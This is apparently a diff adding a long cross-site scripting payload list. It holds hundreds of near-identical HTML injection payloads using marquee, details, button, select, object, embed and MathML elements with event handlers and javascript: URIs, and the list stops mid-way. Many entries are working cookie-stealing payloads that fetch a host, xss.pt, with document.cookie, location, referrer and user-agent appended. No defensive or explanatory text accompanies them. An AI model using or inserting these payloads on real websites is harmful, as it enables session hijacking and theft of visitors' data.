+<marquee/onstart=globalThis['alert'](1)>
+<marquee/onstart=globalThis['alert'](document.cookie)>
+<marquee/onstart=globalThis['alert']('XSS')>
+<marquee/onstart=alert`1`>
+<marquee/onstart=alert``>
+<marquee/onstart=alert(1)>
+<marquee/onstart=alert(1);>
+<marquee/onstart=alert(1)//>
+<marquee/onstart=alert(1)/*>
+<marquee/onstart=alert(1)<!-->
+<marquee/onstart=alert(1)--> >
+<marquee/onstart=alert(1);alert(2)>
+<marquee/onstart=alert(1);alert(2);alert(3)>
+<marquee/onstart=alert(1);alert(2);alert(3);alert(4)>
+<marquee/onstart=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<details/open/ontoggle=alert(1)>
+<details/open/ontoggle=alert(document.cookie)>
+<details/open/ontoggle=alert('XSS')>
+<details/open/ontoggle=alert("XSS")>
+<details/open/ontoggle=alert(/XSS/)>
+<details/open/ontoggle=alert(1);>
+<details/open/ontoggle=alert(1)//>
+<details/open/ontoggle=alert(1)/*>
+<details/open/ontoggle=alert(1)<!-->
+<details/open/ontoggle=alert(1)--> >
+<details/open/ontoggle=alert(1);alert(2)>
+<details/open/ontoggle=alert(1);alert(2);alert(3)>
+<details/open/ontoggle=alert(1);alert(2);alert(3);alert(4)>
+<details/open/ontoggle=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<details/open/ontoggle=fetch('http://xss.pt/steal?c='+document.cookie)>
+<details/open/ontoggle=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>
+<details/open/ontoggle=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>
+<details/open/ontoggle=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)>
+<details/open/ontoggle=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)>
+<details/open/ontoggle=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)>
+<details/open/ontoggle=console.log(1)>
+<details/open/ontoggle=console.log(document.cookie)>
+<details/open/ontoggle=console.log('XSS')>
+<details/open/ontoggle=console.log("XSS")>
+<details/open/ontoggle=prompt(1)>
+<details/open/ontoggle=prompt(document.cookie)>
+<details/open/ontoggle=prompt('XSS')>
+<details/open/ontoggle=prompt("XSS")>
+<details/open/ontoggle=confirm(1)>
+<details/open/ontoggle=confirm(document.cookie)>
+<details/open/ontoggle=confirm('XSS')>
+<details/open/ontoggle=confirm("XSS")>
+<details/open/ontoggle=document.write(1)>
+<details/open/ontoggle=document.write(document.cookie)>
+<details/open/ontoggle=document.write('XSS')>
+<details/open/ontoggle=document.write("XSS")>
+<details/open/ontoggle=eval('alert(1)')>
+<details/open/ontoggle=eval('alert(document.cookie)')>
+<details/open/ontoggle=eval('alert(\"XSS\")')>
+<details/open/ontoggle=setTimeout('alert(1)',0)>
+<details/open/ontoggle=setTimeout('alert(document.cookie)',0)>
+<details/open/ontoggle=setTimeout('alert(\"XSS\")',0)>
+<details/open/ontoggle=setInterval('alert(1)',0)>
+<details/open/ontoggle=setInterval('alert(document.cookie)',0)>
+<details/open/ontoggle=setInterval('alert(\"XSS\")',0)>
+<details/open/ontoggle=Function('alert(1)')()>
+<details/open/ontoggle=Function('alert(document.cookie)')()>
+<details/open/ontoggle=Function('alert(\"XSS\")')()>
+<details/open/ontoggle=(alert)(1)>
+<details/open/ontoggle=(alert)(document.cookie)>
+<details/open/ontoggle=(alert)('XSS')>
+<details/open/ontoggle=alert.call(null,1)>
+<details/open/ontoggle=alert.call(null,document.cookie)>
+<details/open/ontoggle=alert.call(null,'XSS')>
+<details/open/ontoggle=alert.apply(null,[1])>
+<details/open/ontoggle=alert.apply(null,[document.cookie])>
+<details/open/ontoggle=alert.apply(null,['XSS'])>
+<details/open/ontoggle=window['alert'](1)>
+<details/open/ontoggle=window['alert'](document.cookie)>
+<details/open/ontoggle=window['alert']('XSS')>
+<details/open/ontoggle=self['alert'](1)>
+<details/open/ontoggle=self['alert'](document.cookie)>
+<details/open/ontoggle=self['alert']('XSS')>
+<details/open/ontoggle=top['alert'](1)>
+<details/open/ontoggle=top['alert'](document.cookie)>
+<details/open/ontoggle=top['alert']('XSS')>
+<details/open/ontoggle=parent['alert'](1)>
+<details/open/ontoggle=parent['alert'](document.cookie)>
+<details/open/ontoggle=parent['alert']('XSS')>
+<details/open/ontoggle=opener['alert'](1)>
+<details/open/ontoggle=opener['alert'](document.cookie)>
+<details/open/ontoggle=opener['alert']('XSS')>
+<details/open/ontoggle=frames['alert'](1)>
+<details/open/ontoggle=frames['alert'](document.cookie)>
+<details/open/ontoggle=frames['alert']('XSS')>
+<details/open/ontoggle=globalThis['alert'](1)>
+<details/open/ontoggle=globalThis['alert'](document.cookie)>
+<details/open/ontoggle=globalThis['alert']('XSS')>
+<details/open/ontoggle=alert`1`>
+<details/open/ontoggle=alert``>
+<details/open/ontoggle=alert(1)>
+<details/open/ontoggle=alert(1);>
+<details/open/ontoggle=alert(1)//>
+<details/open/ontoggle=alert(1)/*>
+<details/open/ontoggle=alert(1)<!-->
+<details/open/ontoggle=alert(1)--> >
+<details/open/ontoggle=alert(1);alert(2)>
+<details/open/ontoggle=alert(1);alert(2);alert(3)>
+<details/open/ontoggle=alert(1);alert(2);alert(3);alert(4)>
+<details/open/ontoggle=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<button onclick=alert(1)>Click</button>
+<button onclick=alert(document.cookie)>Click</button>
+<button onclick=alert('XSS')>Click</button>
+<button onclick=alert("XSS")>Click</button>
+<button onclick=alert(/XSS/)>Click</button>
+<button onclick=alert(1);>Click</button>
+<button onclick=alert(1)//>Click</button>
+<button onclick=alert(1)/*>Click</button>
+<button onclick=alert(1)<!-->Click</button>
+<button onclick=alert(1)--> >Click</button>
+<button onclick=alert(1);alert(2)>Click</button>
+<button onclick=alert(1);alert(2);alert(3)>Click</button>
+<button onclick=alert(1);alert(2);alert(3);alert(4)>Click</button>
+<button onclick=alert(1);alert(2);alert(3);alert(4);alert(5)>Click</button>
+<button onclick=fetch('http://xss.pt/steal?c='+document.cookie)>Click</button>
+<button onclick=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>Click</button>
+<button onclick=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>Click</button>
+<button onclick=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)>Click</button>
+<button onclick=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)>Click</button>
+<button onclick=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)>Click</button>
+<button onclick=console.log(1)>Click</button>
+<button onclick=console.log(document.cookie)>Click</button>
+<button onclick=console.log('XSS')>Click</button>
+<button onclick=console.log("XSS")>Click</button>
+<button onclick=prompt(1)>Click</button>
+<button onclick=prompt(document.cookie)>Click</button>
+<button onclick=prompt('XSS')>Click</button>
+<button onclick=prompt("XSS")>Click</button>
+<button onclick=confirm(1)>Click</button>
+<button onclick=confirm(document.cookie)>Click</button>
+<button onclick=confirm('XSS')>Click</button>
+<button onclick=confirm("XSS")>Click</button>
+<button onclick=document.write(1)>Click</button>
+<button onclick=document.write(document.cookie)>Click</button>
+<button onclick=document.write('XSS')>Click</button>
+<button onclick=document.write("XSS")>Click</button>
+<button onclick=eval('alert(1)')>Click</button>
+<button onclick=eval('alert(document.cookie)')>Click</button>
+<button onclick=eval('alert(\"XSS\")')>Click</button>
+<button onclick=setTimeout('alert(1)',0)>Click</button>
+<button onclick=setTimeout('alert(document.cookie)',0)>Click</button>
+<button onclick=setTimeout('alert(\"XSS\")',0)>Click</button>
+<button onclick=setInterval('alert(1)',0)>Click</button>
+<button onclick=setInterval('alert(document.cookie)',0)>Click</button>
+<button onclick=setInterval('alert(\"XSS\")',0)>Click</button>
+<button onclick=Function('alert(1)')()>Click</button>
+<button onclick=Function('alert(document.cookie)')()>Click</button>
+<button onclick=Function('alert(\"XSS\")')()>Click</button>
+<button onclick=(alert)(1)>Click</button>
+<button onclick=(alert)(document.cookie)>Click</button>
+<button onclick=(alert)('XSS')>Click</button>
+<button onclick=alert.call(null,1)>Click</button>
+<button onclick=alert.call(null,document.cookie)>Click</button>
+<button onclick=alert.call(null,'XSS')>Click</button>
+<button onclick=alert.apply(null,[1])>Click</button>
+<button onclick=alert.apply(null,[document.cookie])>Click</button>
+<button onclick=alert.apply(null,['XSS'])>Click</button>
+<button onclick=window['alert'](1)>Click</button>
+<button onclick=window['alert'](document.cookie)>Click</button>
+<button onclick=window['alert']('XSS')>Click</button>
+<button onclick=self['alert'](1)>Click</button>
+<button onclick=self['alert'](document.cookie)>Click</button>
+<button onclick=self['alert']('XSS')>Click</button>
+<button onclick=top['alert'](1)>Click</button>
+<button onclick=top['alert'](document.cookie)>Click</button>
+<button onclick=top['alert']('XSS')>Click</button>
+<button onclick=parent['alert'](1)>Click</button>
+<button onclick=parent['alert'](document.cookie)>Click</button>
+<button onclick=parent['alert']('XSS')>Click</button>
+<button onclick=opener['alert'](1)>Click</button>
+<button onclick=opener['alert'](document.cookie)>Click</button>
+<button onclick=opener['alert']('XSS')>Click</button>
+<button onclick=frames['alert'](1)>Click</button>
+<button onclick=frames['alert'](document.cookie)>Click</button>
+<button onclick=frames['alert']('XSS')>Click</button>
+<button onclick=globalThis['alert'](1)>Click</button>
+<button onclick=globalThis['alert'](document.cookie)>Click</button>
+<button onclick=globalThis['alert']('XSS')>Click</button>
+<button onclick=alert`1`>Click</button>
+<button onclick=alert``>Click</button>
+<button onclick=alert(1)>Click</button>
+<button onclick=alert(1);>Click</button>
+<button onclick=alert(1)//>Click</button>
+<button onclick=alert(1)/*>Click</button>
+<button onclick=alert(1)<!-->Click</button>
+<button onclick=alert(1)--> >Click</button>
+<button onclick=alert(1);alert(2)>Click</button>
+<button onclick=alert(1);alert(2);alert(3)>Click</button>
+<button onclick=alert(1);alert(2);alert(3);alert(4)>Click</button>
+<button onclick=alert(1);alert(2);alert(3);alert(4);alert(5)>Click</button>
+<select onchange=alert(1)><option>1</option></select>
+<select onchange=alert(document.cookie)><option>1</option></select>
+<select onchange=alert('XSS')><option>1</option></select>
+<select onchange=alert("XSS")><option>1</option></select>
+<select onchange=alert(/XSS/)><option>1</option></select>
+<select onchange=alert(1);><option>1</option></select>
+<select onchange=alert(1)//><option>1</option></select>
+<select onchange=alert(1)/*><option>1</option></select>
+<select onchange=alert(1)<!--><option>1</option></select>
+<select onchange=alert(1)--> ><option>1</option></select>
+<select onchange=alert(1);alert(2)><option>1</option></select>
+<select onchange=alert(1);alert(2);alert(3)><option>1</option></select>
+<select onchange=alert(1);alert(2);alert(3);alert(4)><option>1</option></select>
+<select onchange=alert(1);alert(2);alert(3);alert(4);alert(5)><option>1</option></select>
+<select onchange=fetch('http://xss.pt/steal?c='+document.cookie)><option>1</option></select>
+<select onchange=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)><option>1</option></select>
+<select onchange=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)><option>1</option></select>
+<select onchange=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)><option>1</option></select>
+<select onchange=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)><option>1</option></select>
+<select onchange=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)><option>1</option></select>
+<select onchange=console.log(1)><option>1</option></select>
+<select onchange=console.log(document.cookie)><option>1</option></select>
+<select onchange=console.log('XSS')><option>1</option></select>
+<select onchange=console.log("XSS")><option>1</option></select>
+<select onchange=prompt(1)><option>1</option></select>
+<select onchange=prompt(document.cookie)><option>1</option></select>
+<select onchange=prompt('XSS')><option>1</option></select>
+<select onchange=prompt("XSS")><option>1</option></select>
+<select onchange=confirm(1)><option>1</option></select>
+<select onchange=confirm(document.cookie)><option>1</option></select>
+<select onchange=confirm('XSS')><option>1</option></select>
+<select onchange=confirm("XSS")><option>1</option></select>
+<select onchange=document.write(1)><option>1</option></select>
+<select onchange=document.write(document.cookie)><option>1</option></select>
+<select onchange=document.write('XSS')><option>1</option></select>
+<select onchange=document.write("XSS")><option>1</option></select>
+<select onchange=eval('alert(1)')><option>1</option></select>
+<select onchange=eval('alert(document.cookie)')><option>1</option></select>
+<select onchange=eval('alert(\"XSS\")')><option>1</option></select>
+<select onchange=setTimeout('alert(1)',0)><option>1</option></select>
+<select onchange=setTimeout('alert(document.cookie)',0)><option>1</option></select>
+<select onchange=setTimeout('alert(\"XSS\")',0)><option>1</option></select>
+<select onchange=setInterval('alert(1)',0)><option>1</option></select>
+<select onchange=setInterval('alert(document.cookie)',0)><option>1</option></select>
+<select onchange=setInterval('alert(\"XSS\")',0)><option>1</option></select>
+<select onchange=Function('alert(1)')()><option>1</option></select>
+<select onchange=Function('alert(document.cookie)')()><option>1</option></select>
+<select onchange=Function('alert(\"XSS\")')()><option>1</option></select>
+<select onchange=(alert)(1)><option>1</option></select>
+<select onchange=(alert)(document.cookie)><option>1</option></select>
+<select onchange=(alert)('XSS')><option>1</option></select>
+<select onchange=alert.call(null,1)><option>1</option></select>
+<select onchange=alert.call(null,document.cookie)><option>1</option></select>
+<select onchange=alert.call(null,'XSS')><option>1</option></select>
+<select onchange=alert.apply(null,[1])><option>1</option></select>
+<select onchange=alert.apply(null,[document.cookie])><option>1</option></select>
+<select onchange=alert.apply(null,['XSS'])><option>1</option></select>
+<select onchange=window['alert'](1)><option>1</option></select>
+<select onchange=window['alert'](document.cookie)><option>1</option></select>
+<select onchange=window['alert']('XSS')><option>1</option></select>
+<select onchange=self['alert'](1)><option>1</option></select>
+<select onchange=self['alert'](document.cookie)><option>1</option></select>
+<select onchange=self['alert']('XSS')><option>1</option></select>
+<select onchange=top['alert'](1)><option>1</option></select>
+<select onchange=top['alert'](document.cookie)><option>1</option></select>
+<select onchange=top['alert']('XSS')><option>1</option></select>
+<select onchange=parent['alert'](1)><option>1</option></select>
+<select onchange=parent['alert'](document.cookie)><option>1</option></select>
+<select onchange=parent['alert']('XSS')><option>1</option></select>
+<select onchange=opener['alert'](1)><option>1</option></select>
+<select onchange=opener['alert'](document.cookie)><option>1</option></select>
+<select onchange=opener['alert']('XSS')><option>1</option></select>
+<select onchange=frames['alert'](1)><option>1</option></select>
+<select onchange=frames['alert'](document.cookie)><option>1</option></select>
+<select onchange=frames['alert']('XSS')><option>1</option></select>
+<select onchange=globalThis['alert'](1)><option>1</option></select>
+<select onchange=globalThis['alert'](document.cookie)><option>1</option></select>
+<select onchange=globalThis['alert']('XSS')><option>1</option></select>
+<select onchange=alert`1`><option>1</option></select>
+<select onchange=alert``><option>1</option></select>
+<select onchange=alert(1)><option>1</option></select>
+<select onchange=alert(1);><option>1</option></select>
+<select onchange=alert(1)//><option>1</option></select>
+<select onchange=alert(1)/*><option>1</option></select>
+<select onchange=alert(1)<!--><option>1</option></select>
+<select onchange=alert(1)--> ><option>1</option></select>
+<select onchange=alert(1);alert(2)><option>1</option></select>
+<select onchange=alert(1);alert(2);alert(3)><option>1</option></select>
+<select onchange=alert(1);alert(2);alert(3);alert(4)><option>1</option></select>
+<select onchange=alert(1);alert(2);alert(3);alert(4);alert(5)><option>1</option></select>
+<object data="javascript:alert(1)">
+<object data="javascript:alert(document.cookie)">
+<object data="javascript:alert('XSS')">
+<object data="javascript:alert("XSS")">
+<object data="javascript:alert(/XSS/)">
+<object data="javascript:alert(1);">
+<object data="javascript:alert(1)//">
+<object data="javascript:alert(1)/*">
+<object data="javascript:alert(1)<!--">
+<object data="javascript:alert(1)--> ">
+<object data="javascript:alert(1);alert(2)">
+<object data="javascript:alert(1);alert(2);alert(3)">
+<object data="javascript:alert(1);alert(2);alert(3);alert(4)">
+<object data="javascript:alert(1);alert(2);alert(3);alert(4);alert(5)">
+<object data="javascript:fetch('http://xss.pt/steal?c='+document.cookie)">
+<object data="javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)">
+<object data="javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)">
+<object data="javascript:console.log(1)">
+<object data="javascript:console.log(document.cookie)">
+<object data="javascript:console.log('XSS')">
+<object data="javascript:prompt(1)">
+<object data="javascript:prompt(document.cookie)">
+<object data="javascript:prompt('XSS')">
+<object data="javascript:confirm(1)">
+<object data="javascript:confirm(document.cookie)">
+<object data="javascript:confirm('XSS')">
+<object data="javascript:document.write(1)">
+<object data="javascript:document.write(document.cookie)">
+<object data="javascript:document.write('XSS')">
+<object data="javascript:eval('alert(1)')">
+<object data="javascript:eval('alert(document.cookie)')">
+<object data="javascript:eval('alert(\"XSS\")')">
+<object data="javascript:setTimeout('alert(1)',0)">
+<object data="javascript:setTimeout('alert(document.cookie)',0)">
+<object data="javascript:setTimeout('alert(\"XSS\")',0)">
+<object data="javascript:setInterval('alert(1)',0)">
+<object data="javascript:setInterval('alert(document.cookie)',0)">
+<object data="javascript:setInterval('alert(\"XSS\")',0)">
+<object data="javascript:Function('alert(1)')()">
+<object data="javascript:Function('alert(document.cookie)')()">
+<object data="javascript:Function('alert(\"XSS\")')()">
+<object data="javascript:(alert)(1)">
+<object data="javascript:(alert)(document.cookie)">
+<object data="javascript:(alert)('XSS')">
+<object data="javascript:alert.call(null,1)">
+<object data="javascript:alert.call(null,document.cookie)">
+<object data="javascript:alert.call(null,'XSS')">
+<object data="javascript:alert.apply(null,[1])">
+<object data="javascript:alert.apply(null,[document.cookie])">
+<object data="javascript:alert.apply(null,['XSS'])">
+<object data="javascript:window['alert'](1)">
+<object data="javascript:window['alert'](document.cookie)">
+<object data="javascript:window['alert']('XSS')">
+<object data="javascript:self['alert'](1)">
+<object data="javascript:self['alert'](document.cookie)">
+<object data="javascript:self['alert']('XSS')">
+<object data="javascript:top['alert'](1)">
+<object data="javascript:top['alert'](document.cookie)">
+<object data="javascript:top['alert']('XSS')">
+<object data="javascript:parent['alert'](1)">
+<object data="javascript:parent['alert'](document.cookie)">
+<object data="javascript:parent['alert']('XSS')">
+<object data="javascript:opener['alert'](1)">
+<object data="javascript:opener['alert'](document.cookie)">
+<object data="javascript:opener['alert']('XSS')">
+<object data="javascript:frames['alert'](1)">
+<object data="javascript:frames['alert'](document.cookie)">
+<object data="javascript:frames['alert']('XSS')">
+<object data="javascript:globalThis['alert'](1)">
+<object data="javascript:globalThis['alert'](document.cookie)">
+<object data="javascript:globalThis['alert']('XSS')">
+<object data="javascript:alert`1`">
+<object data="javascript:alert``">
+<object data="javascript:alert(1)">
+<object data="javascript:alert(1);">
+<object data="javascript:alert(1)//">
+<object data="javascript:alert(1)/*">
+<object data="javascript:alert(1)<!--">
+<object data="javascript:alert(1)--> ">
+<object data="javascript:alert(1);alert(2)">
+<object data="javascript:alert(1);alert(2);alert(3)">
+<object data="javascript:alert(1);alert(2);alert(3);alert(4)">
+<object data="javascript:alert(1);alert(2);alert(3);alert(4);alert(5)">
+<embed src="javascript:alert(1)">
+<embed src="javascript:alert(document.cookie)">
+<embed src="javascript:alert('XSS')">
+<embed src="javascript:alert("XSS")">
+<embed src="javascript:alert(/XSS/)">
+<embed src="javascript:alert(1);">
+<embed src="javascript:alert(1)//">
+<embed src="javascript:alert(1)/*">
+<embed src="javascript:alert(1)<!--">
+<embed src="javascript:alert(1)--> ">
+<embed src="javascript:alert(1);alert(2)">
+<embed src="javascript:alert(1);alert(2);alert(3)">
+<embed src="javascript:alert(1);alert(2);alert(3);alert(4)">
+<embed src="javascript:alert(1);alert(2);alert(3);alert(4);alert(5)">
+<embed src="javascript:fetch('http://xss.pt/steal?c='+document.cookie)">
+<embed src="javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)">
+<embed src="javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)">
+<embed src="javascript:console.log(1)">
+<embed src="javascript:console.log(document.cookie)">
+<embed src="javascript:console.log('XSS')">
+<embed src="javascript:prompt(1)">
+<embed src="javascript:prompt(document.cookie)">
+<embed src="javascript:prompt('XSS')">
+<embed src="javascript:confirm(1)">
+<embed src="javascript:confirm(document.cookie)">
+<embed src="javascript:confirm('XSS')">
+<embed src="javascript:document.write(1)">
+<embed src="javascript:document.write(document.cookie)">
+<embed src="javascript:document.write('XSS')">
+<embed src="javascript:eval('alert(1)')">
+<embed src="javascript:eval('alert(document.cookie)')">
+<embed src="javascript:eval('alert(\"XSS\")')">
+<embed src="javascript:setTimeout('alert(1)',0)">
+<embed src="javascript:setTimeout('alert(document.cookie)',0)">
+<embed src="javascript:setTimeout('alert(\"XSS\")',0)">
+<embed src="javascript:setInterval('alert(1)',0)">
+<embed src="javascript:setInterval('alert(document.cookie)',0)">
+<embed src="javascript:setInterval('alert(\"XSS\")',0)">
+<embed src="javascript:Function('alert(1)')()">
+<embed src="javascript:Function('alert(document.cookie)')()">
+<embed src="javascript:Function('alert(\"XSS\")')()">
+<embed src="javascript:(alert)(1)">
+<embed src="javascript:(alert)(document.cookie)">
+<embed src="javascript:(alert)('XSS')">
+<embed src="javascript:alert.call(null,1)">
+<embed src="javascript:alert.call(null,document.cookie)">
+<embed src="javascript:alert.call(null,'XSS')">
+<embed src="javascript:alert.apply(null,[1])">
+<embed src="javascript:alert.apply(null,[document.cookie])">
+<embed src="javascript:alert.apply(null,['XSS'])">
+<embed src="javascript:window['alert'](1)">
+<embed src="javascript:window['alert'](document.cookie)">
+<embed src="javascript:window['alert']('XSS')">
+<embed src="javascript:self['alert'](1)">
+<embed src="javascript:self['alert'](document.cookie)">
+<embed src="javascript:self['alert']('XSS')">
+<embed src="javascript:top['alert'](1)">
+<embed src="javascript:top['alert'](document.cookie)">
+<embed src="javascript:top['alert']('XSS')">
+<embed src="javascript:parent['alert'](1)">
+<embed src="javascript:parent['alert'](document.cookie)">
+<embed src="javascript:parent['alert']('XSS')">
+<embed src="javascript:opener['alert'](1)">
+<embed src="javascript:opener['alert'](document.cookie)">
+<embed src="javascript:opener['alert']('XSS')">
+<embed src="javascript:frames['alert'](1)">
+<embed src="javascript:frames['alert'](document.cookie)">
+<embed src="javascript:frames['alert']('XSS')">
+<embed src="javascript:globalThis['alert'](1)">
+<embed src="javascript:globalThis['alert'](document.cookie)">
+<embed src="javascript:globalThis['alert']('XSS')">
+<embed src="javascript:alert`1`">
+<embed src="javascript:alert``">
+<embed src="javascript:alert(1)">
+<embed src="javascript:alert(1);">
+<embed src="javascript:alert(1)//">
+<embed src="javascript:alert(1)/*">
+<embed src="javascript:alert(1)<!--">
+<embed src="javascript:alert(1)--> ">
+<embed src="javascript:alert(1);alert(2)">
+<embed src="javascript:alert(1);alert(2);alert(3)">
+<embed src="javascript:alert(1);alert(2);alert(3);alert(4)">
+<embed src="javascript:alert(1);alert(2);alert(3);alert(4);alert(5)">
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert("XSS")>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(/XSS/)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)//>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)/*>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)<!-->Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)--> >Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);alert(2)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);alert(2);alert(3)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);alert(2);alert(3);alert(4)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1);alert(2);alert(3);alert(4);alert(5)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:fetch('http://xss.pt/steal?c='+document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:console.log(1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:console.log(document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:console.log('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:prompt(1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:prompt(document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:prompt('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:confirm(1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:confirm(document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:confirm('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:document.write(1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:document.write(document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:document.write('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:eval('alert(1)')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:eval('alert(document.cookie)')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:eval('alert(\"XSS\")')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:setTimeout('alert(1)',0)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:setTimeout('alert(document.cookie)',0)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:setTimeout('alert(\"XSS\")',0)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:setInterval('alert(1)',0)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:setInterval('alert(document.cookie)',0)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:setInterval('alert(\"XSS\")',0)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:Function('alert(1)')()>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:Function('alert(document.cookie)')()>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:Function('alert(\"XSS\")')()>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:(alert)(1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:(alert)(document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:(alert)('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert.call(null,1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert.call(null,document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert.call(null,'XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert.apply(null,[1])>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert.apply(null,[document.cookie])>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:alert.apply(null,['XSS'])>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:window['alert'](1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:window['alert'](document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:window['alert']('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:self['alert'](1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:self['alert'](document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:self['alert']('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:top['alert'](1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:top['alert'](document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:top['alert']('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:parent['alert'](1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:parent['alert'](document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:parent['alert']('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:opener['alert'](1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:opener['alert'](document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:opener['alert']('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:frames['alert'](1)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:frames['alert'](document.cookie)>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:frames['alert']('XSS')>Click</maction></math>
+<math><maction actiontype=statusline xlink:href=javascript:globalThis['alert'](1)>Click</maction></math>
